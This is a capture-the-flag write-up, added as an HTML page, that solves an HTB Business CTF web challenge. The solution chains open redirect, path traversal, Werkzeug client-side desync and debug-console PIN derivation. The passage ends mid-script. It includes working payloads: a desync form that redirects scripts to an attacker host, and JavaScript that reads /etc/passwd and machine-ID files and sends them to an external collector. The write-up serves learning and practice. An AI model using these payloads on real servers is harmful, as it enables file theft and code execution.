@@ -1,0 +1,445 @@
+<h1 id="web-desynth-recruit">Web Desynth Recruit</h1>
+
+<p>Me and my friend (@0xbla) spent our weekend solving a very interesting challenge from HTB Business CTF</p>
+
+<p>The challenge was very realistic and it required you to chain a lot of other bugs to solve it, probably the best one we have ever seen.</p>
+
+<p>I will give you a basic idea about the challenge:</p>
+
+<p>The application had basic login/signup flow
+<img src="https://github.com/Sudistark/CTF-Writeups/assets/31372554/f0ac9707-b786-423a-8f37-7d04237e3a5f" alt="image" /></p>
+
+<p>Once logged in you were redirect to the <code class="language-plaintext highlighter-rouge">/settings</code> endpoint which allowed you to make changes to your profile: http://localhost:1337/settings</p>
+
+<p><img src="https://github.com/Sudistark/CTF-Writeups/assets/31372554/4746400e-81fa-4eba-af17-2f4ea3c4134b" alt="image" /></p>
+
+<p>The Bio input field says that <em>Bio (limited HTML supported)</em> , so we will put some basic html tags and see if they are rendered or not <code class="language-plaintext highlighter-rouge">&lt;i&gt;shirley&lt;/i&gt;</code> , there is also a file upload which only allows to upload png files.
+Once we submit this form , we get this message: <em>Your profile is now public</em></p>
+
+<p>We can now visit our profile via this url : http://localhost:1337/profile/3
+(The id 1,2 are reserved for other users probably admin)</p>
+
+<p><img src="https://github.com/Sudistark/CTF-Writeups/assets/31372554/7ae40860-a2f9-42e0-ae2e-a45b98387d36" alt="image" /></p>
+
+<p>From the above screenshot you could see that the <em>Bio</em> field html code didn’t worked although it said that basic html tags were allowed. I also tried some more tags but all of them weren’t rendered.
+On the right side you could see we have <em>Report a user</em> functionality where we could report any user profile by just supplying it’s user id.</p>
+
+<p>Going through burp history , I found this endpoint: http://localhost:1337/go?to=/login
+It was found to be vulnerable to open redirect, let’s add it to our note and move forward with the source code review part.</p>
+
+<hr />
+
+<h1 id="source-code">Source Code</h1>
+
+<p>The application is in python Flask and it is running in debug mode</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">application.main</span> <span class="kn">import</span> <span class="n">app</span>
+
+<span class="n">app</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="sh">'</span><span class="s">0.0.0.0</span><span class="sh">'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">1337</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>The flag is stored on the file system not exposed anywhere else so we might need a rce and also the location is random.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># change flag name</span>
+<span class="nb">mv</span> /flag.txt /flag<span class="si">$(</span><span class="nb">cat</span> /dev/urandom | <span class="nb">tr</span> <span class="nt">-cd</span> <span class="s1">'a-f0-9'</span> | <span class="nb">head</span> <span class="nt">-c</span> 10<span class="si">)</span>.txt
+</code></pre></div></div>
+
+<p>The routes are defined here: /application/blueprints/routes.py</p>
+
+<p>We can confirm the open redirect root cause from here:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@web.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/go</span><span class="sh">'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">goto_external_url</span><span class="p">():</span>
+    <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">to</span><span class="sh">'</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>These one routes which isn’t allowed to be access by normal user, looked interesting:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@api.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/ipc_download</span><span class="sh">'</span><span class="p">)</span>
+<span class="nd">@is_authenticated</span>
+<span class="k">def</span> <span class="nf">ipc_download</span><span class="p">(</span><span class="n">user</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">user</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]</span> <span class="o">!=</span> <span class="sh">'</span><span class="s">admin</span><span class="sh">'</span><span class="p">:</span>
+        <span class="k">return</span> <span class="nf">response</span><span class="p">(</span><span class="sh">'</span><span class="s">Unauthorized</span><span class="sh">'</span><span class="p">),</span> <span class="mi">401</span>
+
+    <span class="n">path</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">current_app</span><span class="p">.</span><span class="n">root_path</span><span class="p">,</span> <span class="n">current_app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">"</span><span class="s">UPLOAD_FOLDER</span><span class="sh">"</span><span class="p">])</span><span class="si">}{</span><span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">file</span><span class="sh">"</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="sh">"</span><span class="s">rb</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
+            <span class="n">file_content</span> <span class="o">=</span> <span class="nb">file</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>
+        <span class="k">return</span> <span class="nc">Response</span><span class="p">(</span><span class="n">file_content</span><span class="p">,</span> <span class="n">mimetype</span><span class="o">=</span><span class="sh">'</span><span class="s">application/octet-stream</span><span class="sh">'</span><span class="p">)</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">return</span> <span class="nf">response</span><span class="p">(</span><span class="sh">'</span><span class="s">Something Went Wrong!</span><span class="sh">'</span><span class="p">)</span>
+
+
+</code></pre></div></div>
+
+<p>This endpoint is responsible for sending the response of the ipc document submitted during profile update but as there is no check on the file param <code class="language-plaintext highlighter-rouge">request.args.get("file")</code> we could path traverse and read any file we want.
+We can’t use this to read the flag directly as the flag has random name suffix to it and also this is only accessible by admin user.</p>
+
+<p>If we want to read the response of this endpoint to read any file we would need a xss bu, which get’s executed in the bot’s browser so that we could access this endpoint and read the response.</p>
+
+<p>The Upload IPC endpoint was also interesting:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@api.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/ipc_submit</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
+<span class="nd">@is_authenticated</span>
+<span class="k">def</span> <span class="nf">ipc_submit</span><span class="p">(</span><span class="n">user</span><span class="p">):</span>
+    <span class="k">if</span> <span class="sh">'</span><span class="s">file</span><span class="sh">'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">request</span><span class="p">.</span><span class="n">files</span><span class="p">:</span>
+        <span class="k">return</span> <span class="nf">response</span><span class="p">(</span><span class="sh">'</span><span class="s">Invalid file!</span><span class="sh">'</span><span class="p">)</span>
+    
+    <span class="n">ipc_file</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">files</span><span class="p">[</span><span class="sh">'</span><span class="s">file</span><span class="sh">'</span><span class="p">]</span>
+
+    <span class="k">if</span> <span class="n">ipc_file</span><span class="p">.</span><span class="n">filename</span> <span class="o">==</span> <span class="sh">''</span><span class="p">:</span>
+        <span class="k">return</span> <span class="nf">response</span><span class="p">(</span><span class="sh">'</span><span class="s">No selected file!</span><span class="sh">'</span><span class="p">),</span> <span class="mi">403</span>
+    
+    <span class="k">if</span> <span class="n">ipc_file</span> <span class="ow">and</span> <span class="nf">allowed_file</span><span class="p">(</span><span class="n">ipc_file</span><span class="p">.</span><span class="n">filename</span><span class="p">):</span>
+        <span class="n">ipc_file</span><span class="p">.</span><span class="n">filename</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">user</span><span class="p">[</span><span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">]</span><span class="si">}</span><span class="s">.png</span><span class="sh">'</span>  <span class="c1"># [1]
+</span>        <span class="n">ipc_file</span><span class="p">.</span><span class="nf">save</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">current_app</span><span class="p">.</span><span class="n">root_path</span><span class="p">,</span> <span class="n">current_app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">UPLOAD_FOLDER</span><span class="sh">'</span><span class="p">],</span> <span class="n">ipc_file</span><span class="p">.</span><span class="n">filename</span><span class="p">))</span> <span class="c1"># [2]
+</span>        <span class="nf">update_ipc_db</span><span class="p">(</span><span class="n">user</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">])</span>
+
+        <span class="k">return</span> <span class="nf">response</span><span class="p">(</span><span class="sh">'</span><span class="s">File submitted! Our moderators will review your request.</span><span class="sh">'</span><span class="p">)</span>
+    
+    <span class="k">return</span> <span class="nf">response</span><span class="p">(</span><span class="sh">'</span><span class="s">Invalid file! only png files are allowed</span><span class="sh">'</span><span class="p">),</span> <span class="mi">403</span>
+</code></pre></div></div>
+
+<p>On line [1], you could see <code class="language-plaintext highlighter-rouge">ipc_file.filename</code> value is taken from the username (which is controllable by the user) and then directly used in <code class="language-plaintext highlighter-rouge">path.join</code> operation.</p>
+
+<p>This is bad practise as it leads to path traversal here also</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="sh">'</span><span class="s">/home/ubuntu</span><span class="sh">'</span><span class="p">)</span>
+<span class="sh">'</span><span class="s">/home/ubuntu</span><span class="sh">'</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="sh">'</span><span class="s">/home/ubuntu</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">sudi</span><span class="sh">'</span><span class="p">)</span>
+<span class="sh">'</span><span class="s">/home/ubuntu/sudi</span><span class="sh">'</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="sh">'</span><span class="s">/home/ubuntu</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">/sudi</span><span class="sh">'</span><span class="p">)</span>
+<span class="sh">'</span><span class="s">/sudi</span><span class="sh">'</span>
+</code></pre></div></div>
+
+<p>If the username is like this <code class="language-plaintext highlighter-rouge">/username</code> then os.path.join operation will return <code class="language-plaintext highlighter-rouge">/username</code> instead (it will ignore everything what’s before) this would have allowed us to have arbitrary file write on the file system which we could we use to overwrite any template then get easy rce but as the application appends the extenion to it <code class="language-plaintext highlighter-rouge">f'{user["username"]}.png'</code> we can’t make use of this as we can;t do anything malicious by overwriting png files.</p>
+
+<p>Examining the bot.py file we discover something:</p>
+
+<p>The report endpoint takes the value from the id parameter but as there is no checks we can provide anything else also there.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@api.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/report</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
+<span class="nd">@is_authenticated</span>
+<span class="k">def</span> <span class="nf">report</span><span class="p">(</span><span class="n">user</span><span class="p">):</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">request</span><span class="p">.</span><span class="n">is_json</span><span class="p">:</span>
+        <span class="k">return</span> <span class="nf">response</span><span class="p">(</span><span class="sh">'</span><span class="s">Missing required parameters!</span><span class="sh">'</span><span class="p">),</span> <span class="mi">401</span>
+    
+    <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="nf">get_json</span><span class="p">()</span>
+
+    <span class="n">user_id</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="p">,</span> <span class="sh">''</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>bot.py</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">client</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">http://localhost:1337/login</span><span class="sh">"</span><span class="p">)</span>
+
+    <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+    <span class="n">client</span><span class="p">.</span><span class="nf">find_element</span><span class="p">(</span><span class="n">By</span><span class="p">.</span><span class="n">ID</span><span class="p">,</span> <span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">).</span><span class="nf">send_keys</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
+    <span class="n">client</span><span class="p">.</span><span class="nf">find_element</span><span class="p">(</span><span class="n">By</span><span class="p">.</span><span class="n">ID</span><span class="p">,</span> <span class="sh">"</span><span class="s">password</span><span class="sh">"</span><span class="p">).</span><span class="nf">send_keys</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
+    <span class="n">client</span><span class="p">.</span><span class="nf">execute_script</span><span class="p">(</span><span class="sh">"</span><span class="s">document.getElementById(</span><span class="sh">'</span><span class="s">login-btn</span><span class="sh">'</span><span class="s">).click()</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+    <span class="n">client</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">http://localhost:1337/profile/</span><span class="si">{</span><span class="nb">id</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span> <span class="o">//</span> <span class="p">[</span><span class="mi">3</span><span class="p">]</span>
+    <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>On line [3] you could see the <code class="language-plaintext highlighter-rouge">id</code> is directly added to the url , this again could lead to path traversal. This one is interesing as we could chain this with the open redirect bug.
+Let me explain the bot was restricted to visit the profile page only but due to the path traversal and open redirect bug we could make the bot visit any page we want.</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+    </span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"../go?to=https://atacker.com/"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>This gave more of a hint that the xss bug can be on any page instead of just the profile page.</p>
+
+<p>We we started looking at the client side javascript code, to look for any xss sink:</p>
+
+<p>At first this looked interesting:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">populateBots</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="kd">let</span> <span class="nx">sBots</span> <span class="o">=</span> <span class="nf">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">.exp-container</span><span class="dl">'</span><span class="p">).</span><span class="nf">data</span><span class="p">(</span><span class="dl">'</span><span class="s1">botExp</span><span class="dl">'</span><span class="p">);</span>
+
+    <span class="kd">let</span> <span class="nx">botsHTML</span> <span class="o">=</span> <span class="s2">`&lt;div class="row justify-content-center"&gt;`</span><span class="p">;</span>
+
+    <span class="k">for</span><span class="p">(</span><span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">botsData</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// [4]</span>
+        <span class="k">if </span><span class="p">(</span><span class="nx">sBots</span><span class="p">.</span><span class="nf">includes</span><span class="p">(</span><span class="nx">botsData</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">name</span><span class="p">))</span> <span class="p">{</span>
+            <span class="nx">botsHTML</span> <span class="o">+=</span> <span class="s2">`
+            &lt;div class='col-md-3 bots-col'&gt;
+                &lt;img src='</span><span class="p">${</span><span class="nx">botsData</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">src</span><span class="p">}</span><span class="s2">' class='bots-img'&gt;
+            &lt;/div&gt;`</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="nx">botsHTML</span> <span class="o">+=</span> <span class="s2">`&lt;/div&gt;`</span><span class="p">;</span>
+
+    <span class="nf">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">.exp-container</span><span class="dl">'</span><span class="p">).</span><span class="nf">html</span><span class="p">(</span><span class="nx">botsHTML</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>[4] botsData is decalred inside this file http://localhost:1337/static/js/global.js</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">.</span><span class="nx">botsData</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="p">{</span>
+       <span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">DisBot</span><span class="dl">"</span><span class="p">,</span>
+       <span class="dl">"</span><span class="s2">src</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">/static/images/bots/jake-parker-discord.png</span><span class="dl">"</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+
+<p>As the source is directly used in the jquery html sink we thought if we can clobber <code class="language-plaintext highlighter-rouge">window.botsData</code> we could get xss.But we couldn’t find any injection point.</p>
+
+<p>Meanwhile my friend pointed out that the <code class="language-plaintext highlighter-rouge">/debug</code> endpoint has Werkzeug console exposed (as the application is running in debug mode), but we don’t know the pin.</p>
+
+<p>This is where we came up with a plan how to solve this challenge by chaining all the pieces we already have.</p>
+
+<p>Searching on google we found this blog https://www.daehee.com/werkzeug-console-pin-exploit/, which explains how you can genrate the PIN if you have a path traversal bug.By following this we should be able to get the PIN</p>
+
+<p>Here’s how the attack will look:
+Consider the xss endpoint to be <code class="language-plaintext highlighter-rouge">/xssendpoint</code></p>
+
+<p>In the report endpoint, modify the id parameter in the request to <code class="language-plaintext highlighter-rouge">../go?to=/xssendpoint</code> . This will redirect the bot to the page where we have xss.Using the  xss bug make a request to the <code class="language-plaintext highlighter-rouge">/api/ipc_download?file=../../../../etc/passwd</code> endpoint and get the response and sent it to our controlled server. (we will fetch the necessary information needed to generate the pin)</p>
+
+<hr />
+
+<h1 id="xss">XSS</h1>
+
+<p>We are still misisng an important piece to prove our attack , xss. At this point we were clueless then my friend pointed our that the challenge name relates <em>web desync</em> maybe we need to exploit this to get xss.
+At that time we both remembered about seeing a new research by @kevin_mizu on <em>Abusing Client-Side Desync on Werkzeug</em> as we were dealing Werkzeug this looked very promising.</p>
+
+<p>https://mizu.re/post/abusing-client-side-desync-on-werkzeug</p>
+
+<p>Oxbla confirmed that it is ineeded vulnerable to desync attack. I was reading the research blog at that time as I am not good with this attack, the version mentioned in that blog was same as what was used in the challenge</p>
+
+<p>requirements.txt</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Flask==2.1.0
+Werkzeug==2.1.0
+</code></pre></div></div>
+
+<p>https://nvd.nist.gov/vuln/detail/cve-2022-29361</p>
+
+<p>Mizu really went deep into his research and even undercover an interesting open redirect to demonstrate how this bug could could be chained together which will lead to account takeover.</p>
+
+<p>I won’t go into the details as Mizu already explained everything very well in simple terms so make sure to read his research before continuing</p>
+
+<p>This is the open redirect which I am talking about :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET http://google.com HTTP/1.1
+Host: localhost:1337
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
+
+
+</code></pre></div></div>
+
+<p>Response:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 308 PERMANENT REDIRECT
+Server: Werkzeug/2.1.0 Python/3.11.4
+Date: Mon, 17 Jul 2023 15:18:31 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 262
+Location: http://google.com/?
+</code></pre></div></div>
+
+<p>Again check the research blog if you want to know the root cause of this.</p>
+
+<p>By using a form such as this:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">"x"</span> <span class="na">action=</span><span class="s">"http://localhost:1337/"</span>
+    <span class="na">method=</span><span class="s">"POST"</span>
+    <span class="na">enctype=</span><span class="s">"text/plain"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;textarea</span> <span class="na">name=</span><span class="s">"GET https://attacker.com HTTP/1.1
+    Foo: x"</span><span class="nt">&gt;</span>Mizu<span class="nt">&lt;/textarea&gt;</span>
+    <span class="nt">&lt;button</span> <span class="na">type=</span><span class="s">"submit"</span><span class="nt">&gt;</span>CLICK ME<span class="nt">&lt;/button&gt;</span>
+    <span class="nt">&lt;/form&gt;</span>
+
+
+<span class="nt">&lt;script&gt;</span> <span class="nx">x</span><span class="p">.</span><span class="nf">submit</span><span class="p">()</span> <span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<p><img src="https://github.com/Sudistark/CTF-Writeups/assets/31372554/d13d01d6-84ca-4975-96f4-49e0c0796de5" alt="image" /></p>
+
+<p>Upon submitting the above form this what happened:
+<img src="https://github.com/Sudistark/CTF-Writeups/assets/31372554/7fdfcc5b-4f7d-4c6b-b3b7-16bbef90c0f8" alt="image" /></p>
+
+<p><em>As we have a Client-Side Desync in Werkzeug, and this kind of attacks allows to control arbitrary bytes of the next request, it is possible to abuse it to recreate the open redirect payload from a malicious HTTP request.</em></p>
+
+<p>Quoting this from Mizu’s blog what’s happening here is that the payload send in the request body is used in the next request</p>
+
+<p>In our case the next request was made to http://localhost:1337/static/js/jquery.js , due to the bug in the parsing the request the server  instead of returning the original jquery.js code it returns a 308 redirect response to https://attacker.com (whatever code is returned by this server will be loaded in the page instead jquery.js) this give us a nice xss.</p>
+
+<p>We can confirm this xss by adding this payload to our index.html file</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">alert</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p><img src="https://github.com/Sudistark/CTF-Writeups/assets/31372554/4899cdfb-f18f-43bf-9c7b-61a01fbfad9d" alt="image" /></p>
+
+<p>Great we have the xss now :)</p>
+
+<p>Sample code to read any local file</p>
+
+<p>index.html</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">fetch</span><span class="p">(</span><span class="dl">'</span><span class="s1">/api/ipc_download?file=../../../../etc/passwd</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span>
+    <span class="na">credentials</span><span class="p">:</span> <span class="dl">'</span><span class="s1">include</span><span class="dl">'</span>
+  <span class="p">})</span>
+    <span class="p">.</span><span class="nf">then</span><span class="p">(</span><span class="nx">response</span> <span class="o">=&gt;</span> <span class="nx">response</span><span class="p">.</span><span class="nf">text</span><span class="p">())</span>
+    <span class="p">.</span><span class="nf">then</span><span class="p">(</span><span class="nx">data</span> <span class="o">=&gt;</span> <span class="p">{</span>
+      <span class="kd">const</span> <span class="nx">encodedData</span> <span class="o">=</span> <span class="nf">btoa</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
+      <span class="kd">const</span> <span class="nx">url</span> <span class="o">=</span> <span class="s2">`https://en2celr7rewbul.m.pipedream.net/?flag=</span><span class="p">${</span><span class="nx">encodedData</span><span class="p">}</span><span class="s2">`</span><span class="p">;</span>
+      <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="nx">url</span><span class="p">;</span>
+    <span class="p">});</span>
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /api/report HTTP/1.1
+Host: 127.0.0.1:1337
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
+Content-Type: application/json
+Content-Length: 94
+
+{
+  "id": "../go?to=http://8033-2409-4089-be8c-ddd4-add9-7e9b-206c-78fb.ngrok-free.app/test.html"
+}
+</code></pre></div></div>
+
+<p>test.html contents</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">"x"</span> <span class="na">action=</span><span class="s">"http://localhost:1337/"</span>
+    <span class="na">method=</span><span class="s">"POST"</span>
+    <span class="na">enctype=</span><span class="s">"text/plain"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;textarea</span> <span class="na">name=</span><span class="s">"GET http://8033-2409-4089-be8c-ddd4-add9-7e9b-206c-78fb.ngrok-free.app HTTP/1.1
+    Foo: x"</span><span class="nt">&gt;</span>Mizu<span class="nt">&lt;/textarea&gt;</span>
+    <span class="nt">&lt;button</span> <span class="na">type=</span><span class="s">"submit"</span><span class="nt">&gt;</span>CLICK ME<span class="nt">&lt;/button&gt;</span>
+    <span class="nt">&lt;/form&gt;</span>
+
+
+<span class="nt">&lt;script&gt;</span> <span class="nx">x</span><span class="p">.</span><span class="nf">submit</span><span class="p">()</span> <span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<p><img src="https://user-images.githubusercontent.com/31372554/254163199-24f67c10-a553-4cf4-a363-36eea20310d5.png" alt="image" /></p>
+
+<hr />
+
+<p>To generate the PIN value on our end we need to know some values beforehand:</p>
+
+<p>https://www.daehee.com/werkzeug-console-pin-exploit/</p>
+
+<p>If you are interested in checking the source which generates the pin here it is: https://github.com/pallets/werkzeug/blob/main/src/werkzeug/debug/<strong>init</strong>.py#L138</p>
+
+<p>We will be using this script to generate the pin: https://github.com/wdahlenburg/werkzeug-debug-console-bypass</p>
+
+<p>As we have alocal setup most of the things we already know:</p>
+
+<blockquote>
+  <p>username is the user who started this Flask
+root</p>
+</blockquote>
+
+<blockquote>
+  <p>modname
+flask.app</p>
+</blockquote>
+
+<blockquote>
+  <p>getattr(app, ‘<strong>name</strong>’, getattr (app .__ class__, ‘<strong>name</strong>’))
+Flask
+getattr(mod, ‘<strong>file</strong>’, None) #is the absolute path of an app.py in the flask directory
+/usr/local/lib/python3.11/site-packages/flask/app.py</p>
+</blockquote>
+
+<blockquote>
+  <p>uuid.getnode()</p>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat</span> /sys/class/net/eth0/address 
+02:42:ac:11:00:04
+root@9d0ff0081967:/app# python3
+Python 3.9.7 <span class="o">(</span>default, Sep  3 2021, 02:02:37<span class="o">)</span> 
+<span class="o">[</span>GCC 10.2.1 20210110] on linux
+Type <span class="s2">"help"</span>, <span class="s2">"copyright"</span>, <span class="s2">"credits"</span> or <span class="s2">"license"</span> <span class="k">for </span>more information.
+<span class="o">&gt;&gt;&gt;</span> <span class="s2">""</span>.join<span class="o">(</span><span class="s2">"02:42:ac:11:00:04"</span>.split<span class="o">(</span><span class="s2">":"</span><span class="o">))</span>
+<span class="s1">'0242ac110004'</span>
+<span class="o">&gt;&gt;&gt;</span> print<span class="o">(</span>0x0242ac110004<span class="o">)</span>
+2485377892356
+
+</code></pre></div></div>
+
+<p>get_machine_id()</p>
+
+<p>Machine Id: /etc/machine-id + /proc/sys/kernel/random/boot_id + /proc/self/cgroup
+With the path traversal we can easily read the values of these files</p>
+
+<p>Here’s the final payload to get all the required info:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="dl">""</span>
+<span class="nx">files</span> <span class="o">=</span> <span class="p">[</span><span class="dl">"</span><span class="s2">/sys/class/net/eth0/address</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">/proc/sys/kernel/random/boot_id</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">/proc/self/cgroup</span><span class="dl">"</span><span class="p">]</span>
+
+
+
+
+<span class="c1">// loop through files fetch and send to server</span>
+
+<span class="nx">files</span><span class="p">.</span><span class="nf">forEach</span><span class="p">(</span><span class="nx">file</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="nf">fetch</span><span class="p">(</span><span class="s2">`/api/ipc_download?file=../../../../</span><span class="p">${</span><span class="nx">file</span><span class="p">}</span><span class="s2">`</span><span class="p">,</span> <span class="p">{</span>
+        <span class="na">credentials</span><span class="p">:</span> <span class="dl">'</span><span class="s1">include</span><span class="dl">'</span>
+    <span class="p">}).</span><span class="nf">then</span><span class="p">(</span><span class="nx">response</span> <span class="o">=&gt;</span> <span class="nx">response</span><span class="p">.</span><span class="nf">text</span><span class="p">())</span>
